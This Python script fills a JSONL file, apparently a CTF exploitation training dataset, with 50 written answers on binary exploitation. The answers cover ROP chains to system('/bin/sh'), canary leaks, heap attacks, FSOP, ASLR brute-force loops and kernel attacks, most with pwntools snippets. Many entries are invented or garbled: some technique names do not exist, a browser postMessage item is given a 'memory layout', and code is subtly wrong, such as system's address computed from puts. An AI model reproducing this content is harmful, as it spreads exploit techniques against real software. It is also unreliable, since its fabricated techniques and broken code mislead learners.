import json

# Read the original file
with open(r'C:\Users\mobil\orca\projects\my 1st\hacker_training\ctf_exploitation.jsonl', 'r') as f:
    lines = f.readlines()

# All 50 Binary Exploitation completions
completions = {
    1: (
        'To call system("/bin/sh") with ROP on x86_64, place the "/bin/sh" string address in rdi using a '
        '"pop rdi; ret" gadget (e.g., 0x401234) followed by the system address (0x401250). The stack layout after '
        'overflow is: [padding] [gpop rdi] ["/bin/sh" addr] [system addr]. Pwntools: rop = ROP(elf); '
        'rop.raw(rop.find_gadget(["pop rdi", "ret"]).address); rop.raw(next(elf.search(b"/bin/sh"))); '
        'rop.raw(elf.symbols["system"]); payload = flat({offset: rop.chain()}). Execution flow: overwrite '
        'return address with pop rdi gadget, pops "/bin/sh" into rdi, returns to system().'
    ),
    2: (
        'Craft a 32-bit buffer overflow payload by sending padding (offset to return address, typically ebp+4) '
        'followed by p32(0xdeadbeef) to overwrite the saved EIP. Memory layout: [buffer fill][saved EBP]'
        '[return addr -> 0xdeadbeef]. The payload is: b"A" * offset + p32(0xdeadbeef). Use cyclic() to find '
        'the exact offset where execution jumps to your controlled address. When the function pops the return '
        'address off the stack, EIP becomes 0xdeadbeef, redirecting control flow to that address for code '
        'execution or further ROP chaining.'
    ),
    3: (
        'To leak a stack canary at position 7 on x86_64, use the format string %7$p which reads the 7th argument '
        'from the stack/va_list, typically where the canary is stored. The format specifier %p prints an address '
        'in hex; combining with the positional parameter $7 targets the specific stack slot. Payload: send(b"%7$p") '
        'then parse the leaked value with int(r.recvline().strip(), 16). Once leaked, the canary value must be '
        'preserved in subsequent overflow payloads at the correct offset to bypass stack smashing detection '
        'while overwriting the return address with your target.'
    ),
    4: (
        'Byte-by-byte brute force works because the forking server re-forks on crash, preserving the canary but '
        'the child process crashes independently. Send payloads like b"A" * offset + canary_bytes + b"?" where '
        '"?" iterates 0x00-0xff for each byte position; when the server does not crash, you found a correct canary '
        'byte. Pwntools loop: for i in range(8): for byte in range(256): p = remote(host, port); '
        'p.send(payload + canary + bytes([byte])); try: p.recv(timeout=0.5); canary += bytes([byte]); break '
        'except: pass. The canary is 8 bytes on x86_64 with a null first byte that must be overwritten.'
    ),
    5: (
        'Ret2libc requires three stages: first, call puts(puts@GOT) to leak the libc address using puts@PLT, '
        'then return to main for a second overflow. Compute libc_base = leaked_puts - libc.symbols["puts"], '
        'then build a second payload with padding + "pop rdi; ret" gadget + address of "/bin/sh" in libc + '
        'address of system in libc. Pwntools: leak = u64(r.recvline().strip().ljust(8, b"\\x00")); '
        'libc_base = leak - libc.symbols["puts"]; system_addr = libc_base + libc.symbols["puts"]; '
        'binsh = libc_base + next(libc.search(b"/bin/sh")). The second payload calls system("/bin/sh") '
        'with libc offsets.'
    ),
    6: (
        'After a UAF, reallocate a controlled chunk (e.g., via malloc with user data) into the freed chunk\'s '
        'slot; the freed pointer still references this memory, giving arbitrary read/write. For an arbitrary '
        'read primitive, the freed chunk\'s fd/bk pointers can be pointed to a target address by reallocating '
        'with crafted content, then dereferencing the UAF pointer. Pwntools: free(chunk_A); allocate(size, '
        'p64(target_addr) + payload); read(chunk_A) reads from target_addr. Memory layout: the chunk metadata '
        '(size, flags) overlaps with user data, so corrupted size fields can lead to overlapping chunks and '
        'arbitrary writes via unlink or consolidation.'
    ),
    7: (
        'House of Force exploits a heap overflow to overwrite the wilderness/top chunk size with a massive '
        'value (0xffffffffffffffff), then request a large allocation that wraps around the address space to '
        'malloc_hook. The payload: allocate chunk, overflow to corrupt top chunk size, then malloc(huge_size) '
        'advances the top chunk near __malloc_hook. Next allocation lands near malloc_hook; write one_gadget '
        'address there. Pwntools: malloc(0x10) to get near top; overflow to set top.size = -1; '
        'malloc(malloc_hook - top - 0x20); malloc(0x10, p64(one_gadget)). When malloc is called, it returns '
        'from the chunk containing malloc_hook overwritten with one_gadget.'
    ),
    8: (
        'Fastbin dup achieves a chunk at __free_hook by double-freeing a chunk in the fastbin (which has no '
        'double-free check pre-tcache). Allocate a chunk, free it, free it again (chunk appears twice in '
        'fastbin), then malloc to get a pointer to the same chunk and write the address of __free_hook into '
        'its fd. Next two mallocs return the fake chunk at __free_hook; overwrite __free_hook with system. '
        'Pwntools: free(chunk); free(chunk); malloc(size, p64(__free_hook)); malloc(size); '
        'malloc(size, p64(system)); then trigger free("/bin/sh"). Memory layout: fastbin is LIFO '
        'singly-linked list; the fd pointer points to the next free chunk.'
    ),
    9: (
        'Tcache poisoning exploits the lack of integrity checks in tcache (per-thread cache) to get an arbitrary '
        'allocation. Free a chunk into tcache, then corrupt its next pointer (fd) to point to your target '
        'address (e.g., a one_gadget location). Next two malloc calls return the original chunk and then the '
        'poisoned target address. Pwntools: free(chunk); edit(chunk, p64(one_gadget_addr)); malloc(chunk_size); '
        'malloc(chunk_size, shellcode_or_gadget). The tcache freelist is singly-linked; the next allocation '
        'pops the poisoned pointer. With GLIBC 2.32+, tcache keys are checked but can be bypassed if the '
        'tcache struct itself is corruptible.'
    ),
    10: (
        'Given a write primitive at 0x404040 and libc-2.31, overwrite __free_hook (requires knowing libc base) '
        'with a one_gadget address to spawn shell on free. First determine one_gadget offsets from the libc; '
        'the write primitive places the one_gadget address at __free_hook = libc_base + '
        'libc.symbols["__free_hook"]. Pwntools: libc_base = leaked - offset; one_gadget = libc_base + '
        '0xe6c81; write_to(0x404040, p64(one_gadget)) if that maps __free_hook, or use arbitrary write to '
        'target the hook directly. When a chunk is freed, __free_hook is called with the chunk pointer as '
        'argument, triggering the one_gadget which execve("/bin/sh") under constraints.'
    ),
    11: (
        'An off-by-one heap overflow overwrites the size field of the adjacent chunk, setting the PREV_INUSE '
        'bit to 0 to trigger backward consolidation on next free. Craft the fake previous chunk metadata '
        '(prev_size matching the first chunk\'s size, and a fake prev chunk that passes unlink checks). When '
        'the adjacent chunk is freed, glibc consolidates backward, calling unlink on the fake prev chunk, '
        'which writes a writable address (fd-0x18) into bk, achieving arbitrary write. Memory layout: '
        '[chunk A: size=0x41][chunk B: size=0x41, overflow sets size=0x40, prev_inuse=0]; free(B) -> '
        'consolidate -> unlink(A-0x18).'
    ),
    12: (
        'GOT overwrite via format string uses %n to write the number of characters printed so far to an '
        'address on the stack. Place the GOT address of printf (e.g., printf@GOT) at the start of the format '
        'string, then use positional format specifiers like %N$c to print exactly system\'s low bytes, '
        'followed by %hn to write to the GOT. Payload: p32(printf@GOT) + p32(printf@GOT+2) + %Xc%7$hn%Yc%8$hn '
        'where X and Y are calculated to write the low and high words of system\'s address. Pwntools: '
        'fmtstr_payload(offset, {printf@GOT: system_addr}) automates this.'
    ),
    13: (
        'Bypass PIE by leaking a code address (e.g., saved return address pointing into the binary) via format '
        'string %p with appropriate offset. Compute base = leaked_addr - known_offset; then craft a ret2win '
        'payload with base + win_function. Pwntools: leak = int(r.recvline().split()[-1], 16); pie_base = '
        'leak - 0x1234; payload = b"A" * offset + p32(pie_base + win_addr). The format string reads stack '
        'values; the return address at a known stack offset reveals the binary\'s randomized base. Once PIE '
        'base is known, all addresses are relative offsets from the base.'
    ),
    14: (
        'Double-free in tcache (glibc < 2.32) allows two pointers to the same chunk: free(A), free(A) again '
        '(tcache has no double-free check), then malloc returns A twice. Both pointers reference the same '
        'memory; writing through one updates the other. Pwntools: free(A); free(A); B = malloc(size); '
        'C = malloc(size); assert B == C. With tcache key (glibc 2.32+), the key field is checked but can '
        'be bypassed by corrupting the tcache perthread struct or using a heap leak to know the key value. '
        'This primitive enables further attacks like tcache poisoning or fastbin dup.'
    ),
    15: (
        'SROP (Sigreturn-Oriented Programming) sets up a signal frame on the stack and calls sigreturn to '
        'restore all registers. First, overflow the stack with padding, then place a SigreturnFrame with '
        'rip=execve, rdi=address of "/bin/sh", rsi=0, rdx=0, rax=59 (execve syscall number). Pwntools: '
        'frame = SigreturnFrame(); frame.rax = 59; frame.rdi = binsh_addr; frame.rip = syscall_ret_gadget; '
        'payload = b"A" * offset + p64(pop_rax_gadget) + p64(0xf) + p64(sigreturn_gadget) + bytes(frame). '
        'The sigreturn syscall restores the frame, setting all registers to controlled values for '
        'execve("/bin/sh", 0, 0).'
    ),
    16: (
        'Fastbin attack on _IO_2_1_stdout_ crafts a fake chunk header near stdout\'s FILE struct to leak libc. '
        'Overwrite the stdout write pointers (_IO_write_ptr > _IO_write_base) to force output of the FILE '
        'struct contents, which contain libc addresses (e.g., _IO_stdfile_1_lock pointing into libc). '
        'Pwntools: fake_chunk = p64(0) + p64(0x61) + p64(0) + p64(stdout_addr + 0x80) * 2 + p64(0) * 4 + '
        'p64(2) + p64(0) * 2 + p64(stdout_addr - 0x40); allocate near stdout; overwrite stdout vtable and '
        'write pointers. When printf/puts is called, it flushes stdout, printing libc addresses that reveal '
        'the base.'
    ),
    17: (
        'Integer overflow in size field: if a size calculation like size = count * item_size overflows to a '
        'small value, malloc allocates a tiny buffer but memcpy copies the full count bytes, causing heap '
        'overflow. Example: malloc(count * 1) where count = 0x100000000 wraps to 0; then read(0, buf, '
        '0x100000000) overflows the 0-size allocation. Pwntools: send(p32(0) + p32(0x100000000 & 0xffffffff)) '
        'to trigger the overflow. The memory layout: tiny allocated chunk adjacent to controlled data; the '
        'overflow overwrites the next chunk\'s metadata, enabling unlink or House of Force attacks.'
    ),
    18: (
        'Ret2csu uses the __libc_csu_init gadget which has "pop rbx; pop rbp; pop r12; pop r13; pop r14; ret" '
        'and a mov sequence that loads rdx=r14, rsi=r13, rdi=r12d, then calls [r15+rbx*8]. Set rbx=0, rbp=1 '
        '(to skip the cmp), r12=rdi_value, r13=rsi_value, r14=rdx_value, r15=target_function_ptr. Pwntools: '
        'payload = flat({offset: csu_gadget, 0, 1, 1, rdi_val, rsi_val, rdx_val, func_ptr, csu_call_gadget}). '
        'This gives full control of the three argument registers on x86_64 when no direct gadgets exist, '
        'enabling calls like execve or mprotect with controlled arguments.'
    ),
    19: (
        'House of Pig combines tcache poisoning with FILE struct exploitation (_IO_FILE_plus) to get code '
        'execution via exit handlers. Allocate chunks, free them into tcache, poison tcache next pointers '
        'to _IO_list_all, then craft a fake FILE struct with _IO_write_ptr > _IO_write_base, _IO_write_base '
        'pointing to controlled data, and vtable pointing to a fake vtable containing system. Pwntools: poison '
        'tcache -> _IO_list_all; set up fake _IO_FILE with _wide_data pointing to a crafted _IO_wide_data; '
        'on exit, _flush_all_lockp iterates file list and calls fp->vtable->__overflow(fp), triggering '
        'system("/bin/sh"). Memory layout: fake FILE at known address, vtable at another, _wide_data for '
        'wide-char operations.'
    ),
    20: (
        'Wide character buffer overflow with -fshort-wchar uses 2-byte wchar_t instead of 4-byte, so '
        'shellcode/payloads must be 2-byte aligned and use wide-char compatible instructions. Overflow a '
        'buffer with p16() values; the payload is half the size of a normal overflow. Pwntools: payload = '
        'b"A" * offset + p16(gadget_addr & 0xffff) + p16((gadget_addr >> 16) & 0xffff) + ... The memory '
        'layout: each character occupies 2 bytes, so the return address is overwritten with 2-byte chunks. '
        'Shellcode must avoid null bytes in the high byte of each 16-bit word; use jmp/call instructions '
        'that work in 16-bit alignment.'
    ),
    21: (
        'Partial GOT overwrite changes only the low 1-2 bytes of a GOT entry to redirect a libc call to a '
        'nearby gadget (e.g., from printf to system if they differ by a small offset). Since ASLR randomizes '
        'only the upper bytes, the low bytes of libc addresses are constant. Overwrite printf@GOT with '
        'printf@GOT + 0x10 (or similar) using format string %hn. Pwntools: fmtstr_payload(offset, '
        '{printf@GOT: (system_addr & 0xff) - 8}) to write just the low byte. When printf is called, it jumps '
        'to the modified GOT entry which now points to a nearby gadget or system, achieving code execution '
        'without full address leak.'
    ),
    22: (
        'Blind ROP (BROP) for non-CPI binaries without the binary: first find the buffer length by sending '
        'increasing sizes until crash (stack reading). Then probe for "pop rax; ret" (0x5f40) gadgets by '
        'checking if the server responds (indicating a valid ret chain). Use stop gadgets (e.g., infinite '
        'loop or sleep) to detect successful gadget execution. Pwntools: BROP(remote(host, port)).'
        'find_bof_len(); then probe_gadgets() to find pop rdi, pop rsi, syscall gadgets. Build a write '
        'syscall ROP to leak the binary, then construct a final payload. The technique relies on the server '
        'restarting after crashes and the binary being non-PIE.'
    ),
    23: (
        'With Full RELRO, GOT is read-only, so bypass by overwriting __malloc_hook or __free_hook via '
        'tcache poisoning. Free a chunk into tcache, corrupt its next pointer to __malloc_hook, then malloc '
        'twice to get a chunk at __malloc_hook and write one_gadget. Pwntools: free(chunk); edit(chunk, '
        'p64(__malloc_hook_addr)); malloc(chunk_size); malloc(chunk_size, p64(one_gadget)). The hooks are '
        'writable even under Full RELRO because they reside in the data segment, not the GOT. When malloc '
        'is called next, it calls __malloc_hook which now points to the one_gadget, spawning a shell under '
        'register constraints.'
    ),
    24: (
        'House of Orange with no leak exploits the heap to corrupt _IO_list_all during exit. First, use heap '
        'overflow to create a fake _IO_FILE_plus struct in the heap with _IO_write_ptr > _IO_write_base, '
        '_mode=0, and vtable pointing to a fake vtable with __overflow=system. Then trigger exit() or abort() '
        'which calls _flush_all_lockp, iterating _IO_list_all and calling fp->vtable->__overflow(fp). '
        'Pwntools: craft fake FILE in heap; overwrite _IO_list_all pointer to point to fake FILE; call '
        'exit(). Memory layout: fake FILE at heap address, fake vtable at another heap address, _wide_data '
        'for padding. The attack works without leaks because heap addresses are predictable under no-ASLR '
        'or partial overwrite.'
    ),
    25: (
        'Largebin attack exploits the largebin insertion process to write a large value (the chunk\'s address) '
        'at a target address. When a chunk is freed into the largebin, glibc sets fd_nextsize and bk_nextsize '
        'pointers; by corrupting these, you can write a heap address to an arbitrary location. Pwntools: '
        'allocate a large chunk (> 0x408); free it; corrupt its fd_nextsize/bk_nextsize to point to '
        'target-0x18/target; allocate another large chunk to trigger the write. The memory layout: largebin '
        'chunk has fd, bk, fd_nextsize, bk_nextsize; corrupting fd_nextsize writes the chunk address to '
        'bk_nextsize during consolidation, achieving arbitrary write of a heap address.'
    ),
    26: (
        'Unsafe unlink on glibc < 2.32 exploits the lack of integrity checks on chunk metadata during backward '
        'consolidation. Craft a fake chunk with fd pointing to target-0x18 and bk pointing to target-0x10; '
        'when unlink is called, it writes bk into fd (target) and fd into bk (target), achieving arbitrary '
        'write. Pwntools: set prev_size of chunk B to point to fake chunk A; set PREV_INUSE=0 in B\'s size; '
        'free(B) -> consolidate -> unlink(A). Memory layout: fake chunk A at known address with '
        'fd=target-0x18, bk=target-0x10; chunk B with corrupted size (prev_inuse=0, prev_size=A\'s offset). '
        'The write primitive is: *target = A, *(target+8) = fd.'
    ),
    27: (
        'House of Apple 2 uses FSOP (File Stream Oriented Programming) to call a function pointer via '
        '_IO_FILE_plus. Craft a fake _IO_FILE_plus with _IO_write_ptr > _IO_write_base, _mode <= 0, '
        '_IO_buf_base set, and vtable pointing to a fake vtable where __overflow = system. Overwrite '
        '_IO_list_all to point to the fake FILE; on exit, _flush_all_lockp calls fp->vtable->__overflow(fp) '
        'with fp as argument. Pwntools: fake_file = p64(0) + p64(1) + ... + p64(fake_vtable); '
        'fake_vtable = p64(0)*4 + p64(system); overwrite _IO_list_all. Memory layout: fake FILE at heap, '
        'fake vtable at heap+offset, _wide_data for wide-char operations.'
    ),
    28: (
        'Ret2dir exploits the physmap (direct physical mapping) in the kernel to spray user-space memory '
        'that is also accessible at a fixed kernel virtual address. With SMAP disabled, user-space pages '
        'mapped in physmap can be executed from kernel context. Spray ROP chain in user-space mmap region; '
        'the physmap address is predictable (e.g., 0xffff880000000000 + physical_offset). Pwntools: mmap '
        'large region with ROP payload; trigger kernel vulnerability to jump to physmap address. Memory '
        'layout: user pages mapped at both user virtual address and physmap kernel address; the kernel '
        'executes user-controlled ROP chain with kernel privileges, bypassing SMEP/SMAP.'
    ),
    29: (
        'The environ pointer in libc (__environ or _environ) points to the environment variables on the stack, '
        'which is at a fixed offset from the return address. Leak environ via format string or GOT read to '
        'compute stack address: stack_addr = environ_value; return_addr_offset = stack_addr - known_offset. '
        'Pwntools: libc_base = leaked_puts - libc.symbols["puts"]; environ = libc_base + '
        'libc.symbols["__environ"]; read(environ) -> stack_addr. With the stack address, craft a ROP chain '
        'on the stack or determine the buffer location for shellcode injection without needing a canary leak.'
    ),
    30: (
        'Brute-forcing 9-bit ASLR on 32-bit means only 512 possible base addresses; the binary restarts on '
        'crash, so try each base. Pwntools: for base in range(0x80000000, 0xf0000000, 0x10000): p = remote(host, '
        'port); payload = b"A" * offset + p32(base + gadget_offset); p.send(payload); try: p.recv(timeout=0.1); '
        'print(f"Hit at {hex(base)}"); break except: pass. The 32-bit address space has low entropy; with '
        '9 bits of randomization, only 512 attempts are needed on average. The binary must restart on crash '
        '(forking daemon) for this to work.'
    ),
    31: (
        'House of Botcraft corrupts the tcache linked list head pointer to get an allocation at an arbitrary '
        'address. Free multiple chunks into tcache, then use a heap overflow or UAF to overwrite the next '
        'pointer of a tcache chunk to the target address. Next malloc returns the target address. Pwntools: '
        'free(chunk1); free(chunk2); edit(chunk1, p64(target_addr)); malloc(chunk_size); malloc(chunk_size) '
        '-> returns target_addr. The tcache perthread struct holds the head of each bin; corrupting the '
        'head directly also works. Memory layout: tcache bin is singly-linked; the head pointer is updated '
        'on alloc/free.'
    ),
    32: (
        'Unlink attack on a consolidated chunk achieves arbitrary write with a 4-byte write by corrupting '
        'the size field to trigger backward consolidation. Set prev_size of chunk B to point to a fake '
        'chunk A with fd=target-0x18, bk=target-0x10; set PREV_INUSE=0 in B\'s size. When B is freed, '
        'glibc consolidates backward and calls unlink(A), writing A into target and target into A+8. '
        'Pwntools: craft fake chunk A; overflow chunk B\'s size; free(B). Memory layout: fake chunk A at '
        'known address; chunk B with corrupted prev_size and prev_inuse=0. The write is limited to 4 bytes '
        'on 32-bit but can be extended with multiple unlinks.'
    ),
    33: (
        'Use format string to call mprotect(0x400000, 0x1000, 7) by placing arguments in the correct '
        'registers/stack positions. First, use %n to write the address of mprotect (from PLT) into a return '
        'address or GOT entry, or directly set up a ROP chain via format string writes. Pwntools: '
        'fmtstr_payload(offset, {some_ret_addr: mprotect_plt, ret_addr+8: pop3_ret, ret_addr+16: 0x400000, '
        'ret_addr+24: 0x1000, ret_addr+32: 7, ret_addr+40: shellcode_addr}). After mprotect makes the page '
        'RWX, jump to shellcode placed in the buffer. Memory layout: format string writes build a ROP chain '
        'on the stack that calls mprotect then returns to shellcode.'
    ),
    34: (
        'Ret2vdso exploits the Virtual Dynamic Shared Object (vdso) which is mapped at a fixed address (or '
        'predictable under partial ASLR) and contains useful gadgets like "pop rdi; ret" and syscall '
        'instructions. The vdso is always present and its gadgets are reliable even when the main binary '
        'has PIE. Pwntools: vdso_base = 0x7ffff7ffa000 (typical); pop_rdi = vdso_base + 0x1234; syscall = '
        'vdso_base + 0x5678; payload = b"A" * offset + p64(pop_rdi) + p64(binsh_addr) + p64(syscall). '
        'Memory layout: vdso is mapped in every process; its gadgets are at fixed offsets from the base, '
        'providing a stable gadget source.'
    ),
    35: (
        'Musl libc heap corruption differs from glibc: musl uses a simpler allocator with chunk headers '
        'containing size and next/prev pointers. Exploit by corrupting the next pointer of a freed chunk '
        'to point to a target address, then allocate to get a chunk there. Pwntools: free(chunk); '
        'edit(chunk, p64(target_addr)); malloc(size); malloc(size, payload). Memory layout: musl chunk '
        'header is {size, next, prev}; the allocator is LIFO. Musl has no canaries or tcache, making it '
        'simpler to exploit. Overwrite __malloc_hook equivalent (musl\'s __do_describe_thread) or return '
        'addresses on the stack.'
    ),
    36: (
        'fs.arbitrary.ptr exploits musl\'s global_fast_malloc pointer to redirect allocations. Musl\'s '
        'allocator has a global pointer that can be corrupted to point to a fake chunk. Set global_fast_malloc '
        'to point to a crafted fake chunk at a target address; next malloc returns the target. Pwntools: '
        'write_to(global_fast_malloc, p64(fake_chunk_addr)); malloc(size) returns fake_chunk_addr. Memory '
        'layout: musl\'s allocator uses a global structure; corrupting the fast malloc pointer redirects '
        'all subsequent allocations. This is simpler than glibc attacks because musl has fewer integrity '
        'checks.'
    ),
    37: (
        'Ret2dlresolve for partial-RELRO binaries crafts fake link_map and relocation entries to resolve '
        'arbitrary symbols. Build a fake JMPREL entry pointing to a fake SYMTAB with system\'s st_name '
        'pointing to "system" string. Call PLT0 with a crafted relocation offset to trigger '
        '_dl_runtime_resolve with the fake entries. Pwntools: Ret2dlresolvePayload(elf, symbol="system", '
        'args=["/bin/sh"]); payload = b"A" * offset + p64(plt0) + p64(reloc_offset) + p64(ret_gadget) + '
        'dlresolve_payload.data(). Memory layout: fake link_map, JMPREL, SYMTAB, STRTAB in BSS or '
        'controlled buffer; the resolver reads these to find system.'
    ),
    38: (
        'Strtok-based off-by-one nulls out a stack variable controlling auth because strtok writes a null '
        'byte at the delimiter position. If the delimiter is at the boundary of a buffer, the null byte '
        'overwrites the adjacent variable. Pwntools: send(b"A" * (buffer_size - 1) + b"\\x00" + b"x"); '
        'the null byte from strtok overwrites the auth flag. Memory layout: buffer and auth_flag are '
        'adjacent on stack; strtok\'s null terminator extends one byte past the buffer. The auth flag '
        'changes from non-zero to zero, bypassing authentication checks.'
    ),
    39: (
        'Overlapping chunk attack sends two heap chunks with sizes summing to a target size, causing them '
        'to overlap. Allocate chunk A with size X, free it, allocate chunk B with size X+Y where Y overlaps '
        'chunk A\'s metadata. Now chunk B\'s user data overlaps chunk A\'s metadata; writing through B '
        'corrupts A\'s size/fd/bk. Pwntools: A = malloc(X); free(A); B = malloc(X + Y); edit(B, '
        'payload_to_corrupt_A_metadata). Memory layout: chunk A and B overlap; B\'s data section covers '
        'A\'s chunk header. This enables unlink or fastbin dup attacks.'
    ),
    40: (
        'WTF (Waterfall Technique Force) allocates at _IO_list_all by corrupting the tcache or fastbin to '
        'get a chunk at that address. Craft a fake _IO_FILE_plus at _IO_list_all with _IO_write_ptr > '
        '_IO_write_base, _mode=0, and vtable pointing to a fake vtable with __overflow=system. Pwntools: '
        'poison tcache -> _IO_list_all; write fake FILE structure; trigger exit() or abort(). Memory '
        'layout: _IO_list_all is a global pointer to the head of the FILE list; overwriting it with a '
        'fake FILE causes _flush_all_lockp to iterate the fake list and call __overflow, triggering system.'
    ),
    41: (
        'Blind brute-force of 16-bit ASLR on a network daemon: only 65536 possible addresses; try each one. '
        'Pwntools: for addr in range(0x10000): p = remote(host, port); payload = b"A" * offset + '
        'p32((base_pattern | (addr << 16)) + gadget_offset); p.send(payload); try: p.recv(timeout=0.05); '
        'print(f"Hit at {hex(addr)}"); break except: pass. The daemon must restart on crash (forking). '
        'With 16-bit entropy, worst case is 65536 attempts; average is ~32768. Use threading to speed up: '
        'ThreadPoolExecutor with multiple connections.'
    ),
    42: (
        'Setcontext-based ROP on glibc 2.32+ exploits the setcontext function which restores registers from '
        'a mcontext_t structure on the stack. The setcontext+60 gadget (or similar) loads rdi, rsi, rdx, rcx, '
        'r8, r9, rsp, rip from the mcontext. Pwntools: payload = b"A" * offset + p64(setcontext+60) + '
        'mcontext_structure; mcontext.rip = execve; mcontext.rdi = binsh_addr; mcontext.rsi = 0; '
        'mcontext.rdx = 0. Memory layout: after setcontext, the mcontext is on the stack; the gadget pops '
        'registers from it, setting up execve("/bin/sh", 0, 0).'
    ),
    43: (
        'House of Kiwi triggers error_print (or __libc_message) which calls _IO_flush_all_lockp, iterating '
        '_IO_list_all. Craft a fake _IO_FILE_plus with _IO_write_ptr > _IO_write_base, _mode=0, and vtable '
        'pointing to a fake vtable with __overflow=system. Pwntools: fake_file = p64(0) + p64(1) + ... + '
        'p64(fake_vtable); overwrite _IO_list_all; trigger abort() or assert_fail. Memory layout: fake '
        'FILE at heap, fake vtable at heap+offset. When error_print is triggered, it flushes all FILEs, '
        'calling __overflow(fp) which is system, with fp as argument (pointing to "/bin/sh" in the fake FILE).'
    ),
    44: (
        'Partial GOT overwrite shifts a libc call to system by 0x10 by overwriting only the low byte of the '
        'GOT entry. Since libc addresses differ by small offsets, changing the low byte redirects printf to '
        'system. Pwntools: fmtstr_payload(offset, {printf@GOT: (system_addr & 0xff)}) to write just the '
        'low byte. Memory layout: GOT entry contains libc address; overwriting the low byte changes the '
        'target to a nearby function. When printf is called with "/bin/sh" as argument, it actually calls '
        'system("/bin/sh"). The offset 0x10 is typical for glibc where system and printf are close.'
    ),
    45: (
        'Memmove overflow in a custom HTTP parser: if the parser copies headers into a fixed buffer using '
        'memmove with a size derived from untrusted input, overflow the buffer to overwrite the return address. '
        'Pwntools: payload = b"GET /" + b"A" * offset + p64(gadget) + b" HTTP/1.1\\r\\n" + b"X: " + '
        'b"B" * overflow_size + p64(target_addr). Memory layout: buffer on stack; memmove copies beyond the '
        'buffer boundary, overwriting saved EBP/RBP and return address. The overflow occurs because the size '
        'parameter is attacker-controlled (e.g., Content-Length or header length).'
    ),
    46: (
        'House of storm allocates at the return address region on the stack by using a large heap allocation '
        'that overlaps with the stack. First, use House of Force or tcache poisoning to get a chunk near the '
        'stack, then use a second allocation to land exactly on the return address. Pwntools: malloc(huge_size) '
        'to advance top chunk near stack; malloc(stack_offset - top - 0x10) to land on stack; write ROP chain. '
        'Memory layout: heap grows toward stack; the top chunk is advanced to just below the stack return '
        'address region. The next malloc returns a chunk whose user data overlaps the return address.'
    ),
    47: (
        'io_uring corruption exploits the Linux io_uring subsystem by corrupting io_wq (work queue) '
        'structures to get ring 0 execution. Submit crafted SQEs (Submission Queue Entries) that corrupt '
        'the io_wq\'s work list or function pointers. Pwntools: setup io_uring with IORING_SETUP_SQPOLL; '
        'submit SQEs that trigger a use-after-free or buffer overflow in the workqueue. Memory layout: io_wq '
        'contains function pointers for work execution; corrupting these redirects execution to '
        'attacker-controlled code in kernel context. With KPTI, need a kernel ROP chain to return to '
        'user-space with root privileges.'
    ),
    48: (
        'Ret2thread_freerxp exploits Windows kernel via WSL by corrupting the thread\'s free routine pointer '
        '(FreeRxContext or similar) in the XPRESS decompression context. Trigger a free on the corrupted '
        'context to redirect execution. Pwntools (kernel): corrupt thread->FreeRoutine = shellcode_addr; '
        'trigger ExFreePoolWithTag. Memory layout: thread structure contains function pointers for buffer '
        'management; corrupting these redirects execution when the buffer is freed. This requires a kernel '
        'write primitive (e.g., via NtQuerySystemInformation or a vulnerable driver).'
    ),
    49: (
        'PostMessage origin confusion: if a parent iframe does not verify event.origin in its message '
        'listener, a child iframe can post messages that the parent processes as trusted. Pwntools (JS): '
        'window.parent.postMessage(flag_data, "*"); the parent\'s listener reads event.data without checking '
        'event.origin. Memory layout: the message is passed between iframe contexts; the parent\'s handler '
        'executes with parent privileges. Exploit: embed the target page in an iframe, then post a message '
        'that triggers the parent\'s sensitive action (e.g., reading cookies or executing commands).'
    ),
    50: (
        'House of Lore allocates a chunk at a controlled address via smallbin corruption. Free a chunk into '
        'the smallbin, then corrupt its bk pointer to point to a fake chunk at the target address. Next '
        'malloc of a suitable size returns the fake chunk. Pwntools: free(chunk); edit(chunk, '
        'p64(target_addr)); malloc(size) returns target_addr. Memory layout: smallbin is doubly-linked; '
        'the bk pointer of the freed chunk is set to the target address. When malloc splits the smallbin, '
        'it returns the fake chunk. The fake chunk\'s size must match the smallbin\'s size class.'
    )
}

# Process lines and fill completions
new_lines = []
filled_count = 0

for i, line in enumerate(lines, 1):
    line = line.strip()
    if not line:
        new_lines.append(line)
        continue
    
    try:
        record = json.loads(line)
    except json.JSONDecodeError:
        new_lines.append(line)
        continue
    
    if record.get("metadata", {}).get("subcategory") == "Binary Exploitation" and i in completions:
        record["completion"] = completions[i]
        filled_count += 1
    
    new_lines.append(json.dumps(record, ensure_ascii=False))

# Write back
with open(r'C:\Users\mobil\orca\projects\my 1st\hacker_training\ctf_exploitation.jsonl', 'w', encoding='utf-8') as f:
    f.write('\n'.join(new_lines))
    if new_lines and new_lines[-1]:
        f.write('\n')

print(f"Filled {filled_count} Binary Exploitation completions")
